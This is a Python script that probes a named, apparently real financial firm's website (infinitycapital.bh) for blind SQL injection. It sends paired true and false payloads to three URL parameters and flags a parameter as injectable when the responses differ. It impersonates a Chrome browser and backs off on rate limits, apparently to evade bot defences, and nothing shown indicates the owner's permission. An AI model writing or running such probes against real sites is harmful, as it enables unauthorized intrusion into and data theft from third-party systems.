"""Differential tester: proves/refutes SQLi claims with a stable oracle."""
from curl_cffi import requests as cr
import time, hashlib, sys, urllib.parse

B = "https://www.infinitycapital.bh"
SESS = cr.Session(impersonate="chrome124")


def fetch(path, delay=3.0):
    for a in range(3):
        try:
            r = SESS.get(B + path, timeout=40, allow_redirects=False)
            if r.status_code == 429:
                print("   [429 backoff]", flush=True)
                time.sleep(delay * 6)
                continue
            return r
        except Exception as e:
            err = e
            time.sleep(3)
    return err


def fp(r):
    if not hasattr(r, "status_code"):
        return ("EXC", 0, str(r)[:40])
    b = r.text
    return (r.status_code, len(b), hashlib.md5(b.encode(errors="ignore")).hexdigest()[:12])


def probe(tag, base, param, delay=3.0):
    mk = lambda p: base.replace("{" + param + "}", urllib.parse.quote(p))
    urls = {
        "BASELINE": mk("1"),
        "TRUE":     mk("' AND 1=1-- -"),
        "FALSE":    mk("' AND 1=2-- -"),
        "SIB":      mk("' AND 2=2-- -"),
    }
    out = {}
    for rnd in range(2):
        for k in ("BASELINE", "TRUE", "FALSE", "SIB"):
            out.setdefault(k, []).append(fp(fetch(urls[k], delay)))
            time.sleep(delay)
    print("### %s" % tag)
    for k in ("BASELINE", "TRUE", "FALSE", "SIB"):
        print("   %-9s %s" % (k, out[k]))
    t = set(x[1:] for x in out["TRUE"])
    f = set(x[1:] for x in out["FALSE"])
    verdict = "INJECTABLE-DIFF" if (t and f and t.isdisjoint(f)) else "no-differential"
    print("   VERDICT:", verdict)
    for k, v in urls.items():
        print("     %s %s" % (k, v))
    return verdict


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    if which in ("all", "page"):
        probe("root / page", "/?page={page}&id=1", "page")
    if which in ("all", "id"):
        probe("api / id", "/api/?id={id}", "id")
    if which in ("all", "cb"):
        probe("contact / cb", "/contact?cb={cb}", "cb")